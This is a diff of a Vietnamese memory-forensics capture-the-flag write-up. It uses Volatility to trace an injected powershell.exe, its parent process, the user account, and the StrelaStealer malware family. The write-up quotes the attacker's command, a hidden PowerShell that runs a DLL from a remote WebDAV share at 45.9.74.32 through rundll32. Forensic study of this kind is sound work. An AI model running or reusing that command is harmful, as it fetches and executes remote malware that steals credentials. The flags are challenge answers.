@@ -11,7 +11,7 @@
 *   **Cách làm:** Sử dụng plugin `windows.malware.malfind` để rà quét và phân tích các vùng nhớ có dấu hiệu bị tiêm mã độc (Code/Memory Injection).
 *   **Thao tác thực hiện:** Thực thi lệnh `python3 vol.py -f 192-Reveal.dmp windows.malware.malfind`. Kết quả phân tích cho thấy tiến trình `powershell.exe` (PID: 3692) chứa các phân vùng bộ nhớ được cấp quyền `PAGE_EXECUTE_READWRITE` (RWX). Trong trạng thái hoạt động bình thường, tiến trình này hiếm khi yêu cầu phân quyền thực thi và ghi đồng thời trên cùng một phân vùng. Đây là dấu hiệu đặc trưng của kỹ thuật thực thi mã độc trên bộ nhớ (Fileless Malware) nhằm lẩn tránh các cơ chế phát hiện tĩnh của giải pháp Antivirus/EDR.
 *   **Bằng chứng:**
-    ![Q1 - Phát hiện powershell.exe bị tiêm mã độc](images/q1_malfind.png)
+    ![Q1 - Phát hiện powershell.exe bị tiêm mã độc](images/q1.png)
 *   **Flag:** `powershell.exe`
 
 ---
@@ -21,7 +21,7 @@
 *   **Cách làm:** Sử dụng plugin `windows.pstree` để tái dựng cây tiến trình, qua đó xác định tiến trình cha (Parent Process) và truy vết luồng thực thi ban đầu.
 *   **Thao tác thực hiện:** Thực thi lệnh `python3 vol.py -f 192-Reveal.dmp windows.pstree`. Từ kết quả kết xuất, định vị tiến trình `powershell.exe` (PID: 3692). Đối chiếu thông số tại cột PPID, ta xác định được mã định danh của tiến trình cha là `4120`. 
 *   **Bằng chứng:**
-    ![Q2 - Truy vết Parent PID 4120](images/q2_pstree.png)
+    ![Q2 - Truy vết Parent PID 4120](images/q2.png)
 *   **Flag:** `4120`
 
 ---
@@ -33,7 +33,7 @@
     `powershell.exe -windowstyle hidden net use \\45.9.74.32@8888\davwwwroot\ ; rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry`
     Cú pháp này cho thấy kẻ tấn công đã chỉ định tiện ích hệ thống `rundll32.exe` để gọi và thực thi tệp thư viện liên kết động có tên `3435.dll`. Tệp tin này đóng vai trò là payload giai đoạn 2 (second-stage payload) của chuỗi tấn công.
 *   **Bằng chứng:**
-    ![Q3 - Tham số dòng lệnh thực thi payload](images/q3_cmdline.png)
+    ![Q3 - Tham số dòng lệnh thực thi payload](images/q3.png)
 *   **Flag:** `3435.dll`
 
 ---
@@ -63,7 +63,7 @@
 *   **Cách làm:** Trích xuất thông tin Security Identifiers (SIDs) để xác định định danh người dùng và mức độ đặc quyền của tiến trình.
 *   **Thao tác thực hiện:** Thực thi lệnh `python3 vol.py -f 192-Reveal.dmp windows.getsids.GetSIDs | grep "3692"`. Kết quả trả về danh sách các SID liên kết với tiến trình. Đối chiếu cấu trúc hệ thống, định danh chủ thể người dùng (mang mã RID 1001) đang sở hữu luồng thực thi này là `Elon`. Việc xác định user context cho thấy tài khoản bị xâm phạm mang cả đặc quyền `Administrators` và `Domain Users`, báo hiệu rủi ro an ninh nghiêm trọng.
 *   **Bằng chứng:**
-    ![Q6 - Trích xuất SID và Username](images/q6_getsids.png)
+    ![Q6 - Trích xuất SID và Username](images/q6.png)
 *   **Flag:** `Elon`
 
 ---
@@ -73,9 +73,9 @@
 *   **Cách làm:** Tích hợp dữ liệu Tình báo Mối đe dọa (Threat Intelligence) để định danh họ mã độc (Malware Family).
 *   **Thao tác thực hiện:** Đầu tiên, từ kết quả truy vết tham số dòng lệnh, ta xác định được địa chỉ IP C2 độc hại là `45.9.74.32`. Tiếp theo, trích xuất Dấu hiệu Thỏa hiệp (IOC) này và tiến hành truy vấn chéo trên nền tảng phân tích bảo mật VirusTotal. Dữ liệu hành vi và các báo cáo cộng đồng chỉ ra rằng chuỗi tấn công và hạ tầng mạng này thuộc về họ mã độc **StrelaStealer** - một biến thể mã độc chuyên thu thập và đánh cắp thông tin đăng nhập từ các máy khách email (Email Clients).
 *   **Bằng chứng:**
-    ![Q7 - Trích xuất IP C2](images/q7_extract_ip.png)
+    ![Q7 - Trích xuất IP C2](images/q7_1.png)
     *Hình 1: Xác định IP độc hại từ tiến trình thực thi.*
     
-    ![Q7 - Tra cứu IOCs trên VirusTotal](images/q7_virustotal.png)
+    ![Q7 - Tra cứu IOCs trên VirusTotal](images/q7_2.png)
     *Hình 2: Kết quả tra cứu định danh mã độc StrelaStealer trên VirusTotal.*
 *   **Flag:** `StrelaStealer`
